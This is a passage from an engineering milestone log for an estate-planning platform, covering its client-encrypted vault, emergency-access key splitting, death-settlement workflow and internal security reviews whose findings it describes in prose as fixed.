  `timeout`, because a container that does NOT exit would otherwise hang the job
  to GitHub's 6-hour limit (an earlier revision did exactly that). The web image
  is verified by actually serving on :3000.

**Deliberate gaps, called out rather than faked:**
- **No registry push and no cosign signing.** Signatures attach to a registry
  reference, and no registry is chosen yet (ECR arrives with the cloud half).
  Pushing would also mean credentials this pipeline should not hold today.
- **Base images pinned by tag, not digest.** docs/03 wants digests; a
  hand-written digest with nothing to refresh it rots into an unpatchable base.
  Digest pinning lands with the registry + an automated bump (Renovate), where
  it can be maintained.
- **Vulnerability gate splits by ownership, not by severity alone.** Blocking on
  every high/critical would mean blocking on the base image: a distroless
  runtime still carries Debian packages and the bundled `node` binary, none of
  which can be patched from here (no package manager in the image), and some are
  marked "won't fix" upstream. The first scan found 21 high/critical — **all** in
  the base, **zero** in this repo's dependency tree. So
  `.github/scripts/gate-image-scan.mjs` blocks on APPLICATION (npm) findings,
  which a developer can fix by bumping a dependency, and reports base findings to
  the job summary. The compensating control for the base is rebasing: images
  rebuild from a floating patch tag every CI run, with Renovate-driven digest
  pinning plus a scheduled rebuild as the tracked follow-up. A gate that is
  permanently red for reasons nobody in this repo can act on trains people to
  ignore it, which is worse for security than a gate that fires only on the
  actionable half.

**Deferred to the cloud half (plan already drafted, pending an AWS account):**
Terraform foundation (remote state, VPC, KMS aliases the code already expects,
Secrets Manager, GitHub OIDC role for CI apply) · data + compute plane (six
Aurora clusters — *not* consolidated, since docs/02's physical separation is the
blast-radius control — MSK with the tier still parameterized, S3, EKS with
Bottlerocket + per-service IRSA so the asset service still cannot unwrap a Plaid
or documents DEK) · GitOps delivery (ArgoCD, Helm, External Secrets, default-deny
NetworkPolicies, Kyverno signed-images admission, a **ClamAV deployment** the
documents service requires in production mode, migration Jobs, and a smoke test
proving the audit hash chain across a **real Kafka broker hop** — retiring an
open item tracked since M1). Dev-tier deviations to re-confirm at that point:
no Shield Advanced (~$3k/mo), no CloudHSM (KMS-managed keys; the
`AwsKmsProvider` path is identical), single region, and OpenSearch/ElastiCache
omitted entirely because no code consumes them yet.

**One code interaction to resolve before the cloud half:** the M4 review fix makes
`template-publish-cli` refuse placeholder-`legalReview` templates when
`NODE_ENV=production` — which is the posture the dev environment will run. Either
the environment gets a loud, dev-account-only opt-in to publish the exemplar
seeds, or it has no active templates and generation returns `template_not_found`.
Preference is the narrow explicit flag over weakening the guard.

### M6 — Vault, Zone A (both PRs shipped)

The first Zone A component. Everything M1–M5 built is server-decryptable under
policy; this is the half of the product where that must be impossible. The
server stores SRP verifiers and opaque client-encrypted blobs and can read none
of it, so a full dump of the vault cluster — insider, subpoena, or stolen
snapshot — yields ciphertext.

**Shipping now (PR1):** `packages/vault-crypto` (the reserved client-crypto
package) and `apps/services/vault` on the vault cluster. SRP-authenticated
enrollment and unlock, opaque versioned items, a step-up-gated open, a
destructive reset for forgotten passwords, and eleven audit actions.

- **2SKD, not password-only.** Keys derive from the vault password AND a
  128-bit Secret Key generated on the device and never transmitted
  (`ES1-…`, checksummed for retyping). That is what makes the server-held
  material — verifier, wrapped master key — useless to an attacker holding the
  database and a correct password guess.
- **PBKDF2 inside 2SKD, an approved deviation from docs/00's Argon2id.**
  WebCrypto has no Argon2, and a WASM Argon2 would trade this package's real
  security property (a dependency-free audit surface on the device, docs/04
  boundary rule 3 / docs/03 TB6) for a defense the Secret Key already provides.
  This is 1Password's shipped design. `kdfParams` is versioned so Argon2id can
  land later without a migration; account passwords keep Argon2id unchanged.
- **Zero runtime dependencies, enforced twice.** An ESLint `no-restricted-syntax`
  fence and a source-scanning spec. `no-restricted-imports` was rejected for the
  job: its `patterns` groups use gitignore-style matching where `*` never
  crosses a `/`, so deep specifiers like `@noble/hashes/sha256` slip through —
  verified against a probe file, which the AST-based fence catches.
- **SRP-6a hand-written on `bigint`** (RFC 5054 4096-bit group, SHA-256), both
  roles in the client package so there is one vector-pinned implementation to
  audit and the service imports the server half. The precedent is the node:crypto
  Plaid webhook verifier, the deterministic template renderer, and the node:net
  clamd client. Two departures from the RFC, pinned by `KDF_VERSION`: `x` comes
  from 2SKD (so the verifier inherits the Secret Key's entropy) and the identity
  is the user's UUID, never their email.
- **The client pins the parameters it is served.** `kdfParams` and the group id
  arrive from the server at unlock, so `assertSupportedKdfParams` rejects
  anything outside the single supported profile *before* any modular
  exponentiation. Without it a malicious server could substitute a degenerate
  group and recover the SRP private key by small-subgroup confinement — against
  exactly the adversary Zone A exists to defeat.
- **Every ciphertext carries a domain-separated AAD**, key wraps included, so
  two same-shaped secrets can never be swapped by a server that cannot read
  either. `blobVersion` is the anti-rollback binding: create uses 1, an update
  of version N encrypts under N+1 and the server must store exactly that. Item
  ids are therefore client-generated (the id is in the AAD), which also makes a
  retried create idempotent — the M3 `eventId` precedent.
- **Keyset replacement needs a cryptographic proof, not just tokens.** A vault
  session is a bearer token; without more, exfiltrated tokens could overwrite the
  keyset with a wrapping of a fresh random master key and destroy every item —
  reading the vault protected by cryptography while destroying it was protected
  only by tokens. So SRP's session key, otherwise computed and discarded,
  authenticates the replacement (`keyset_auth_key`). Storing a key derived from
  it leaks nothing new: the server computes that session key by construction,
  and a database-level attacker could rewrite the row directly anyway.
- **Reset destroys, it does not recover.** The escape hatch for a forgotten
  password, and necessarily gated by session + step-up rather than proof — you
  cannot prove knowledge of a password you have lost. Destruction is
  cryptographic and rests on the keyset history design: replacing the keyset
  overwrites `wrapped_master_key` and history never kept a copy. That is
  necessary but not sufficient — emergency access adds a SECOND live wrapping,
  so reset must tear the escrow down too, which the security review below found
  it failing to do. With that fixed, the retained item rows are permanently
  opaque.
  Structure preserved, meaning destroyed — crypto-shredding applied to a zone
  with no DEKs. It is the one route where stolen tokens can destroy (never read)
  a vault; compensating controls are step-up freshness, a distinct `vault.reset`
  action, and owner notification once the notification port lands.

**Schema (docs/02 §5), with the deviations stated:**
- `vault_keysets` is versioned like every other table, **but the captured row
  image redacts `wrapped_master_key` and `srp_verifier`**. A no-history
  exemption was proposed and declined; this is the narrower answer. Elsewhere
  the full prior row is the audit trail, and its ciphertext opens with the same
  key as the live row. Here it inverts: the master key does not change when the
  password does, so a retained old wrapping plus a phished retired password
  would open the *current* vault. History keeps who changed the keyset, when,
  and under which parameters — the audit-firewall instinct, applied to a table.
  Versioned by `user_id` (its PK, no surrogate `id`) on the `profiles`
  precedent, so it is asserted via `appendOnlyTables` plus explicit checks.
- `vault_items` is a full business table with history: an old blob is ciphertext
  under the same master key, so retaining it grants nothing new, and item
  version history is a product feature.
- Blobs capped at 68 KiB (~64 KiB of content). Size is the only property the
  server can measure, and an unbounded opaque blob is a storage DoS and a slow
  list. Large attachments need a streaming path — a follow-up, not a silent
  allowance.
- `vault_srp_handshakes` and `vault_sessions` are operational tables on the
  `auth.sessions` precedent. A handshake is consumed by the ATTEMPT, not by
  success, so each guess costs a fresh round trip and its own audit event.
- `emergency_access_policies` is deliberately **not** created yet: it ships with
  PR2, so no dormant schema sits under migration drift detection (the M3
  Plaid-DDL decision).

**Coverage note:** the vault service floor gates the CI number (85/70/87/85)
rather than the local no-Postgres one. Almost all of its logic is a database
transaction, so a run without `PG_TEST_URL` covers ~45%; setting the floor there
would gate at half the real number. CI always sets it, enforced by
`test/ci-guard.spec.ts`.

**Known gaps, deliberately:** no rate limiting or lockout on failed SRP proofs
(the same follow-up as identity's login rate limiting — edge WAF + Redis
counters per docs/01; the interim controls are handshake burn-on-attempt and the
`vault.open.failed` audit stream) · 404-before-403 on item reads, bounded by
unguessable UUIDs, the same accepted class as M3/M4 · audit emits after commit,
no transactional outbox (the M3 follow-up) · no web UI, since a vault surface
needs the isolated-origin and CSP/Trusted-Types work of docs/03 TB6 and deserves
its own milestone · autofill, password generator, and family sharing from
docs/00 §7 are not in M6.

**PR2 — emergency access** (docs/03 §5.2). The control set, and why each one is
shaped the way it is:

- **Two-level split, so the waiting period is real.**
  `RK = platform_part XOR contacts_part`, with `contacts_part` split Shamir
  M-of-N over the grantees. The XOR is a one-time pad, so every grantee
  colluding still cannot reconstruct RK without the platform half. Without that
  the "waiting period" would be an honour system among the very people the
  §5.2 attack is about. M-of-N is fully implemented (GF(2^8), field laws tested
  directly) with threshold 1 as the shipped default.
- **Denial is sticky, and there is deliberately no cooldown.** A denied policy
  refuses further requests until the owner *re-arms* it. A time-based cooldown
  would tell a patient grantee exactly how long to wait, and waiting the owner
  out — until they are hospitalised or simply offline — is docs/03 §5.2's actual
  attack. Every request attempt, including the refused ones, is audited and
  notified, because the owner's after-the-fact review is itself a control.
- **Denial is NOT step-up gated**, alone among owner actions. It has to be one
  tap from a push notification, possibly on a locked phone. A step-up challenge
  between an owner and "no" is a control that defeats itself. Configure, re-arm
  and revoke *are* step-up gated per docs/01 §5.
- **Release is one-shot.** Handing over the platform half spends the escrow;
  `revoked` cannot un-ring that bell, so recovery is re-splitting a fresh key.
- **Key authenticity is in scope.** The service serves a grantee's public key
  and the owner's client confirms its short fingerprint out of band before
  sealing to it; the key each share was sealed to is recorded, so a later
  substitution is detectable. Skipping this would let a malicious server
  substitute its own key and — already holding `platform_part` and the
  recovery-wrapped master key — read the entire escrow.
- **Notifications are a precondition.** In production the emergency-access
  routes refuse while only the stub notifier is wired. Scoped to those routes
  rather than boot, so the rest of the vault keeps working; real channels arrive
  with the notifications milestone.

**Residual, stated rather than buried:** the platform half lives on the server,
so a server that chooses to release it early defeats the waiting period. That is
inherent to docs/01's design — a delay enforced by a party is only as good as
that party — and the compensating controls are the audit trail and owner
notification. What the split does guarantee is that a database dump alone is not
enough, and a rogue contact alone is not enough either.

**Deferred, with rationale:** §5.2's per-item *scope limits* (granting a subset
of the vault) — PR1's per-item keys already make this a later grant feature
rather than a re-architecture; and §5.1 control 5, settlement's staged access
with vault emergency access last and separately approved, is an M7 integration
point (PR2's release path will consult settlement state once settlement exists).

One latent bug worth recording, found by the suite rather than by review:
`configure` inserts every policy in one transaction, so they share `created_at`,
and ordering by it alone was non-deterministic. Fixed by tie-breaking on `id`.

**M6 security review (2026-07-27).** Structured review of the whole merged M6
range (`845cccd..4521909`, PR1 #12 + PR2 #13): six parallel discovery passes —
the Zone A boundary, the hand-written crypto, authorization and step-up
placement, the emergency-access state machine, the data layer, and untrusted
input — with every candidate finding then adversarially re-verified against
source by an agent instructed to refute it. 35 raw candidates, 28 unique, the 14
most severe verified; 11 refuted outright.

**No critical and no app-surface-exploitable vulnerability in the Zone A
guarantee.** Nothing found lets the server learn, derive, or accumulate a client
secret, and nothing found grants unauthorized read access to a vault. Three
defects survived verification, all in the seam PR2 added around PR1's keyset
lifecycle — PR1's core (2SKD, SRP, AAD binding, proof-gated keyset replacement)
held under every attack tried. All three are fixed in this branch.

- **Reset did not tear down the emergency-access escrow, so the documented
  crypto-shred was incomplete (medium).** `VaultService.reset` touched items,
  the keyset and sessions, but never `emergency_access_configs` — which holds
  `wrapped_master_key_recovery`, a *second live wrapping of the same master
  key*, with the server keeping `platform_part` and the grantees holding Shamir
  shares of the other half. So for any user who had armed emergency access, the
  claim made in the reset docstring, the service README, this document and the
  CLAUDE.md decision log — that the old master key "ceases to exist anywhere" —
  was false. A designated contact could wait out the ≥24h period, release, and
  reconstruct the key the owner had been told was destroyed; the pre-reset item
  ciphertext persists by design (`reset` only sets `deleted_at`, and the version
  trigger captured full row images), and that retention is *justified* by the
  shred claim. Turning it into plaintext additionally needs vault-cluster,
  backup or subpoena access, which is why this is medium rather than high — but
  that is precisely the adversary crypto-shredding exists to defeat. There was
  also a plain correctness consequence: the surviving escrow escrowed a dead
  key, so a genuine post-death recovery would have burned its one-shot release
  and yielded a master key that opens nothing, silently. Notably the authors
  already redact superseded wraps from both version tables on the reasoning that
  "a superseded wrapping is not history but a live attack asset" — the surviving
  live escrow row was exactly that asset, so this was an oversight rather than a
  choice. **Fixed:** reset now deletes the escrow config, soft-deletes the
  policies and clears the owner's grantee keypair in the same transaction, and
  reports `escrowPoliciesRetired` in the `vault.reset` audit detail. Three
  regression tests cover it, and the false claim is corrected everywhere it was
  made.
- **The grantee key fingerprint carried 50 bits, not the 80 its own comment
  specified (medium).** `publicKeyFingerprint` emitted 10 Crockford symbols in
  two groups while its docstring said "16 characters in four groups", and the
  test pinned the weaker behaviour rather than the comment. This is not a
  display detail: the fingerprint is the *sole* named defense against a
  malicious server substituting its own key at configure time, and nothing
  server-side can check it — `grantee_public_key_sha256` is derived client-side
  from whatever key the client was handed, so it binds to a substituted key just
  as happily. At 50 bits a targeted second-preimage grind is GPU-days, entirely
  offline and undetectable; at 80 it is 2^80. Held below high only because no
  client consumes the fingerprint yet (no vault UI ships in M6). **Fixed:** 16
  symbols in four groups, consumed as a bitstream so all 80 bits come from
  distinct digest bits, with the constant exported and asserted.
- **Reset left the user's own published grantee key while destroying its private
  half (low, recovery availability).** The private half is wrapped under the
  master key reset destroys, but `findPublicKey` had no liveness predicate, so
  other owners arming escrows *afterwards* would seal shares to a key nobody can
  open — an escrow that reports healthy and fails at the one moment it must
  work, silently dropping the reachable share count below threshold under
  M-of-N. **Fixed:** reset clears both columns (the DDL's all-or-nothing CHECK
  already permitted it), so a stale contact now fails visibly at configure time.

**Attacked and held.** The Zone A boundary itself: every server-held artifact
was traced for a path to plaintext and none exists. SRP-6a: the client's pinning
of served `kdfParams` and group id before any modular exponentiation defeats the
degenerate-group substitution the scheme would otherwise fall to, and handshakes
are consumed by the attempt rather than by success, so guessing cannot be
batched against one challenge. The keyset-proof control verifies the MAC over
the payload as received, before any write. The escrow split holds in both
directions: a full grantee coalition without `platform_part` gets nothing, and a
database dump without the shares gets nothing. The state machine resisted every
attempt to reach release early, replay it, route it through a revoked policy, or
desensitize the owner with a blocked-notification flood before the request that
matters. Authorization and step-up placement matched docs/01 §5 on every route,
including deny's deliberate absence. Two plausible candidates — "release should
be step-up gated" and "configure destroys an escrow on a bearer token" — were
refuted on the same ground: the step-up-fresh stolen-token adversary already
holds the strictly greater, explicitly accepted `POST /v1/vault/reset`
capability, so neither adds reach.

**Informational, left as-is.** No owner notification when `configure` silently
retires existing grantees (a design addition inside the open notifications
follow-up, which also covers reset) · SRP's 4096-bit modexp runs synchronously
on the request thread at ~63 ms each, worth a line in the existing SRP
rate-limit follow-up · the opaque-blob fields lack the file's own base64 charset
refine and an `octet_length` CHECK, inert on every reachable path · a 500-item
page is ~46 MB of base64, the same authenticated self-attributable capacity
class M4 accepted for uploads · the server never cross-checks
`sha256(public_key)` against the submitted digest at configure time (cheap
defense in depth; the owner-side fingerprint remains the documented authority).

**Coverage gaps for the next reviewer.** This pass reviewed the hand-written
primitives' protocol wiring, not their cryptanalysis: the `bigint` modPow timing
profile, the SRP safety checks line-by-line against RFC 5054, and the GF(2^8)
share-index and coefficient-randomness handling all deserve a dedicated pass.
WebCrypto P-256 import paths were not audited for point validation on the
sealing side. The notifications adapter is unreviewed by construction (only the
stub is wired and the routes 503 in production), so the notifications milestone
needs its own pass including delivery-channel identifier leakage. Concurrency
was reasoned about but not fuzzed — parallel releases, a configure racing a
request, and a reset racing an in-flight unlock all rest on row locks that were
read rather than stress-tested. Finally, migration drift over the redaction
lists is a standing hazard: any future column on `vault_keysets` or
`emergency_access_configs` is captured into history by default, so a future
secret-bearing column would silently inherit the wrong policy. A convention test
asserting the redaction set against the live column list would close that.

### M7 — Settlement (both PRs shipped; reviewed)

The first milestone where the acting principal is routinely NOT the resource
owner, and the first that changes another user's account state. docs/03 §5.1
("kill them on paper", risk #2, Critical) is the specification; the §6b delta
records the control-by-control landing. Scope decisions were asked and
approved up front: no Temporal in M7 (driver port, below), a separate
`apps/services/settlement` co-tenant on the CORE cluster, human review by
CLI-allowlisted operators, and the M6 vault-gate integration point landing in
PR2.

**PR1 — case core: intake → review → waiting period → verified, plus the
cross-service account lock.**

- **The state machine is Postgres, per docs/02 §7; Temporal is deferred — an
  approved deviation from docs/01 §7's letter.** Rationale: the cloud
  environment Temporal's durability would protect was itself deferred in M5;
  running a Temporal server (+ its own store, SDK with a native core, worker
  image, CI story) would buy dev-only fidelity at real cost. The shape keeps
  adoption a drop-in: the only scheduled work is the owner-contact sweep
  (`SettlementService.runContactSweep`, idempotent per (case, seq)), driven by
  a deliberately POWERLESS in-process driver — case state never advances on a
  timer, so losing the driver degrades contact liveness, never safety.
  Temporal later replaces the setInterval around the same method.
- **Co-tenancy extended, flagged**: settlement shares the core cluster with
  profile (disjoint tables, own migrations dir, shared schema_migrations — the
  Plaid precedent) AND holds read-only use of profile's
  `contacts`/`role_assignments`; docs/02 §7 places settlement in core
  precisely because its rows reference core contacts. Production DB grants:
  SELECT-only on those two tables. The settlement integration spec migrates
  BOTH services' migration sets into one scratch schema, proving the co-owner
  mechanics.
- **Intake cannot enumerate and cannot trigger.** Reporters act only on
  estates already naming them (`contacts.linked_user_id`); uniform not_found
  otherwise; provider matches are operator-filed signals; one open case per
  decedent; self-reports rejected. A report opens a case, notifies the owner
  (seq-0 of the append-only contact trail), and locks nothing.
- **Review and verification are separate human acts.** Approve (step-up,
  reviewer ≠ reporter by CHECK + row check) starts the waiting period
  (default 5d, owner-configurable UP to 60, frozen while a case is open) and
  locks the account; a lapsed timer only makes the case eligible;
  verify-confirm (step-up, again never the reporter) re-checks owner liveness
  against identity's step-up ledger and voids on a step-up newer than the
  case (`409 owner_alive`, account restored, reporter flagged). The owner's
  kill switch is a step-up-gated void — the step-up IS the liveness proof.
- **The liveness check is enforced twice, and the second one is the load-
  bearing one.** A pre-push adversarial review found a TOCTOU: settlement read
  liveness, then made two more calls before committing, so a step-up landing
  in that window was invisible — and with no un-verify ceremony, that
  irreversibly entombs a *living* owner in `settlement`, precisely §5.1's
  Critical outcome. Fixed by restating the predicate inside identity's CAS
  `UPDATE` (`NOT EXISTS` over `auth_events`, same statement, same cluster);
  the refusal comes back as a typed `OwnerAliveError` that settlement converts
  into the void path, unwinding its own in-transaction `markVerified`. The
  residual (a step-up committing inside that one statement) is recorded in
  docs/03 §6b with its bounded blast radius.
- **The account lock is identity-enforced.** New internal settlement-lock API
  behind `ServiceCredentialGuard` (@estate/auth-guard; constant-time compare,
  fail-closed unwired, ≥32 chars required in production) — the one genuinely
  new trust mechanism, interim until mesh identity, recorded with rationale
  (no user bearer exists for these calls; identity cannot know settlement's
  allowlist). Identity applies its own closed transition table
  (active↔deceased_pending→settlement), revokes ALL sessions at verified, and
  adds a status ALLOWLIST to the live-session SQL — a status flip without it
  would have left 15-min access and 30-DAY refresh tokens usable.
  deceased_pending deliberately keeps the owner's login/sessions alive (the
  §5.1 rescue path) while `account_settled` login refusals are distinctly
  recorded (decedent-credential replay = detection signal). Lock calls run
  INSIDE the case transaction; unconfirmable ⇒ rollback.
- **Role-holder reads freeze at the lock** (§5.1 control 4): profile's
  `effectiveContactReadGrants` — the platform's one live non-owner read path —
  gains a NOT EXISTS predicate over open settlement cases, feature-detected
  via to_regclass so profile keeps working on clusters where settlement's
  migration has not run (deploy-order independence).
- **Evidence stays owner-encrypted.** A death certificate is uploaded through
  the documents service under the REPORTER's own account (new
  `death_certificate`/`court_document` upload categories); the case records
  {documentId, version, addedBy} only. Operators read it through a dedicated
  documents route (`/v1/evidence/...`) whose authority is settlement's answer
  (operator allowlist + evidence registry), forwarded on the operator's own
  bearer via the new fail-closed `@estate/settlement-client`, and
  cross-checked: settlement's recorded attacher must equal the document's
  real owner, so registering someone ELSE's document id as evidence yields a
  uniform 404, never a decryption. Audited as `document.evidence.accessed`
  with onBehalfOf = the document owner.
- **AuthZ**: new narrow `settlement.cedar` (every permit scoped
  `resource is SettlementCase`; the case carries `decedent`/`reporter`
  attributes, deliberately NOT `owner` — owner.cedar would grant the subject
  operator verbs on their own death case). Operator authority is a resolved
  `isSettlementOperator` principal attribute (profile.cedar resolve-first
  pattern); a no-widening test proves an operator gains nothing on Zone B
  resources.
- **Notifications are a precondition** (M6 precedent): intake and
  review-approve refuse 503 in production while only the stub notifier is
  wired, gated on the adapter's own capability bit.
- Audit: nine `settlement.*` actions + `auth.user.status_changed`,
  `auth.sessions.revoked_all`, `document.evidence.accessed` (closed enum,
  IDs/enums only; the case trail is itself a §5.1 control). Ops surface:
  `operator-cli.ts` is the ONLY allowlist write path (template-publish-cli
  precedent). Tests: 54 settlement unit tests + a PG suite proving the DDL
  CHECKs, the co-owner migration mechanics, the GUC-stamped version trail,
  and the full flow; e2e boots identity+profile+settlement, drives the real
  ServiceCredentialGuard, proves the rescue path, the grant freeze, the
  credential kill at verified, the step-up-gated void, and ingests
  settlement's produced audit bytes into a verified hash chain.

**PR2 — post-verification administration (shipped).**

- **The ladder is the control.** `settlement_access_stages` implements
  inventory → documents → vault with no skipping: an executor may request only
  the next rung, and each rung needs a separate operator approval, so Zone A is
  structurally the furthest grant from a fresh report. Requester ≠ approver is
  a DDL CHECK. Executor identity comes from `role_assignments`
  (`role='executor'`, `effective_condition='on_death_verified'`) — settlement
  is the first consumer of the dormant half of the M2 role model, and
  designation alone still grants nothing.
- **docs/03 §6a closed at last.** The vault consults settlement at BOTH
  `request` and `release` — twice because the waiting period is days long and
  an estate can enter settlement in between — inside the transaction, after the
  row lock. Any non-terminal case without an approved `vault` stage blocks, and
  so does an unreachable settlement (the client fails closed everywhere).
  Blocking is the safe direction: the escrow is unspent and releases once the
  stage lands, whereas allowing hands a fraudulent heir the platform half
  during exactly the §5.1 window. Authenticated by the SERVICE credential —
  the grantee's bearer must not mint an answer about the owner's estate.
  Refusals audit as `vault.emergency.release_blocked`.
- **Dual control as a CHECK, not a trigger — a deliberate deviation from
  docs/02 §7's wording.** With `created_by` (additive, and required by the
  doc's own note) the approver and recorder are columns of the SAME row, so a
  row-local CHECK is strictly stronger than a trigger: immediate, undeferrable,
  and impossible to disable per-session. The doc's intent is preserved; only
  the mechanism is simpler. The one CONSTRAINT TRIGGER precedent in the repo
  (assets' share-sum) exists because that invariant spans rows.
- **Amounts are ciphertext under settlement's own KEK.** `settlement_deks` +
  `settlement/kek` (the plaid_deks precedent), keyed by the DECEDENT so
  crypto-shredding an estate retires every amount at once. Profile co-tenants
  the cluster and still cannot read them — the KMS grant is the chokepoint.
  The plaintext amount is a decimal STRING end to end (never a float) and
  appears in no column, log, or audit payload.
- **Executor reads stay the data owner's decision.** Assets gained a separate
  `/v1/estates/:ownerUserId/assets` route that forwards the caller's bearer to
  settlement and refuses on anything short of an explicit allow; the owner path
  is untouched. Settlement holds no data-read power itself, so compromising it
  mis-answers rather than exfiltrates. Reads audit as `asset.estate.viewed`.
- **Legal hold gained a writer ROUTE** — a service-credential internal route on
  documents (`PUT /internal/v1/legal-hold`), intended for settlement.
  CORRECTED (credential-graph work, 2026-07-28): this was written as "gained
  its writer, closing the M4 gap", which overstated it. Nothing in the repo
  called that route: settlement declared no documents credential and had no
  documents port, and `DOCUMENTS_INTERNAL_TOKEN` was not production-required,
  so a default deploy had documents refusing every legal-hold call. The gap
  stayed open, recorded in the graph as an edge with zero holders.
  **CLOSED in M9 PR2 (2026-08-04):** settlement's `documents-hold.ts` client
  now drives the hold from the case transitions, the graph edge reads
  `holders: ['settlement']`, and the credential is production-required on both
  sides — see the M9 record.
- Also: the task checklist generated in the same transaction as verification
  from an in-repo versioned template (anchored on `verified_at`; date of death
  is deliberately never stored), the estate timeline, and operator case close
  gated on all distributions being terminal.
- Tests: 92 settlement (the ladder, both dual-control rules, the vault-gate
  truth table, the PII firewall over every PR2 payload), 162 vault including
  two integration tests that prove the gate blocks a request and a mid-wait
  release, and 25 settlement-client. Coverage floors re-measured with
  `--coverage`; vault's ratcheted UP to 89/72/92/90.

**M7 security review (2026-07-28).** Structured review of the whole merged M7
range (`a278635..4d24537`, PR1 #15 + PR2 #16): six parallel discovery passes —
the death-trigger control chain against docs/03 §5.1 line by line, the new
service-to-service trust boundary, authorization and step-up placement across
five services, the case state machine and its concurrency, the cross-service
data layer and co-tenancy, and the audit/PII firewall — with every candidate
then adversarially re-verified against source by an agent instructed to refute
it and to default to refuted when uncertain. 23 raw candidates, 23 unique, the
12 most severe verified; 6 confirmed and 6 refuted.

**No single-source, single-actor or timer-driven path to settlement was found.**
Every attempt to move a case forward with one report, one operator, one expired
clock, or one compromised session was refused by the control that was supposed
to refuse it; the twice-human verification, the reviewer ≠ reporter and
approver ≠ requester rules, the stage ladder and the owner-liveness interlock
all held. The six confirmed findings collapse to two distinct defects, both in
machinery M7 itself introduced, and both contradicting documentation written in
the same milestone. Both are fixed in this branch.

- **The service credential collapsed four services onto one secret (high).**
  Found independently by four of the six discovery passes. `SETTLEMENT_INTERNAL_TOKEN`
  was simultaneously what settlement *expected* on its own inbound gate route
  and what it *presented* outbound to identity — one config field serving both
  directions. Because vault and documents must hold settlement's inbound value
  to ask the docs/03 §6a gate question, and settlement's outbound value must
  equal identity's expected value, any working deployment forced identity,
  settlement, vault and documents onto one identical string. The consequence is
  not theoretical: whoever holds vault's copy can call
  `PUT /internal/v1/settlement-lock/{victim}` twice — `deceased_pending`, then
  `settlement`, with any UUID as `caseId` and `livenessNotAfter` simply omitted
  so the liveness interlock never engages — and irreversibly entomb any active
  user. No case, no operator, no waiting period, no notification, no owner-void
  window: docs/03 §5.1's Critical outcome reached by skipping the entire control
  chain the milestone was built to enforce. It is worse than a lateral-movement
  finding because vault is the *most* exposed service in the product and, by
  Zone A design, the one that should hold the least authority. The
  `ServiceCredentialGuard` docstring asserted the credential was "provisioned to
  exactly the two services that share it" while it was four — the gap between
  the documented and the actual trust graph is what let this pass PR review
  twice. **Fixed:** one secret per CALLEE, per direction. Each variable is now
  named for the service whose routes it opens — `IDENTITY_INTERNAL_TOKEN`
  (settlement→identity, the only lock-capable credential),
  `SETTLEMENT_INTERNAL_TOKEN` (vault→settlement's read-only gate),
  `DOCUMENTS_INTERNAL_TOKEN` (settlement→documents' legal hold). Splitting the
  field is only half the fix, because an operator pasting one secret into both
  slots recreates the collapse exactly, so settlement's config now *refuses to
  boot in production* when its two credentials are equal. The guard's docstring
  states the rule rather than a headcount, and an e2e test asserts the gate
  credential is rejected by the account-lock API and leaves the victim active
  and logged in.
- **The profile grant-freeze probe cached a negative for the process lifetime
  (medium, fail-open).** `RolesRepo` detects the co-tenant `settlement_cases`
  table with `to_regclass` so profile keeps working against a core cluster where
  settlement's migrations have not run. It memoised the answer in both
  directions, so a profile process that started before settlement deployed had
  §5.1 control 4 — role-holder reads freeze while a case is at or past its
  waiting period — compiled out of its SQL permanently and silently. Grantees
  would keep reading a possibly-deceased owner's contacts through a case's
  entire waiting period, and the only symptom is the control's absence. docs/04
  claimed "deploy-order independence" for this predicate; that was true of the
  ordering and false of the caching. **Fixed:** only the positive is cached (the
  table cannot un-exist), the negative is re-probed, and three unit tests pin
  the re-probe, the positive cache, and the exact frozen status set.

**Also fixed while in here.** `revokeStage` had no requester ≠ decider
pre-check, so an operator who is also the executor that requested a stage hit
the DDL CHECK unhandled: a `23514` surfaced as a 500 with the access still
granted, indistinguishable from an outage. The unused `isCheckViolation` helper
was flagged as the tell. It now refuses cleanly (403, second operator must
revoke) with the CHECK as backstop, and the in-memory stage fake restates the
constraint it was silently permitting.

**Attacked and held.** Intake as an enumeration oracle: reporters must already
be linked contacts, so there is no email/id lookup and unlinked reporters get a
uniform `not_found`. Waiting-period compression: settings are configurable UP
only and frozen while a case is open, and the driver holds no transition power
at all — a lapsed clock only makes a case *eligible*. The owner-liveness
interlock survived a dedicated concurrency pass: the CAS `UPDATE`'s `NOT EXISTS`
over `auth_events` closes the window settlement's read leaves open, and the
`409 owner_alive` → `OwnerAliveError` → void path correctly unwinds the
in-transaction `markVerified`. Evidence reads: the attacher-must-equal-owner
cross-check means a reporter registering someone else's document id yields a
uniform 404, never a decryption. Cedar: every settlement permit is scoped
`resource is SettlementCase`, and the deliberate omission of an `owner`
attribute keeps owner.cedar from granting a subject operator verbs on their own
death case. The §6a vault gate fails closed on an unreachable settlement in both
`request()` and `release()`. The audit PII firewall held over every new payload.
Six candidates were refuted outright, including "the driver can advance a case"
(it cannot write status), "a lapsed waiting period auto-verifies" (it does not),
and "the reporter can approve their own report" (DDL CHECK plus app guard).

**Informational, left as-is.** The static service credential has no rotation
story — replacing one is a synchronized restart of two services, which the
mesh/SPIFFE follow-up removes rather than papers over · a settled account's
`404` vs `403` distinction on some settlement reads is a mild status oracle to
an authenticated caller, matching the M4 finding left open on the same grounds ·
operator actions are audited but not rate-limited, deferred with the TB7
operator platform · the contact-attempt sweep re-reads due attempts on every
tick with no jitter, a load characteristic rather than a control.

**Coverage gaps for the next reviewer.** This pass reasoned about concurrency
from the lock ordering rather than fuzzing it: parallel stage decisions, a void
racing a verify, and two operators approving distinct distributions on one case
all rest on row locks that were read, not stress-tested. The operator CLI's
allowlist writes were reviewed as code but never exercised against a hostile
argv. Nothing here reviews the *absence* of Temporal under real failure — the
in-process driver's behaviour across a mid-sweep crash is untested because no
deployment exists to crash it, and that gap closes with the cloud environment,
not before. The notification port is unreviewed by construction (stub only, and
the routes 503 in production). Finally, the credential split fixed above makes
the trust graph correct but still *undocumented as a graph*: a table of which
service holds which credential, asserted by a test, would keep the next
addition from re-collapsing it.

**Follow-ups recorded, not silently dropped:** Temporal adoption (with the
cloud environment) · the notifications service (unblocks production
settlement intake) · per-reporter intake rate limits (with identity's
rate-limit follow-up) · TB7 operator platform replacing the allowlist (JIT
elevation, peer approval; also closes the one-operator-two-actions residual)
· edge quotas for settlement endpoints (WAF work) · a data-provider intake
isolate service · beneficiary contact-link projection (assets'
`namedBeneficiaries`) · transactional outbox (standing).

### M8 — The local stack (all five PRs shipped; reviewed)

A flagged deviation: docs/04 had M8 as the AI assistant. The local stack went
first because nothing in the repo had ever run as a deployed system — M5's
images were built and verified in CI and never executed; every production
adapter (`AwsKmsProvider`, `S3ObjectStore`, `ClamdScanner`,
